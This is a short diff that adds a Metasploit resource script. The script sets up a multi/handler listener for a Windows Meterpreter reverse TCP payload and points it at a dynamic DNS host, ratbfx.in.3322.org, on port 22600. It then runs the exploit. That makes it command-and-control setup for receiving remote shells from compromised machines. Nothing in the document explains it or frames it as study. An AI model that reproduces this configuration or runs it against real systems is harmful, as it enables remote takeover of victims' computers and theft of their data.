@@ -1,0 +1,6 @@
+use exploit/multi/handler
+set Payload windows/meterpreter/reverse_tcp
+set Lhost ratbfx.in.3322.org
+set Lport 22600
+show options
+exploit
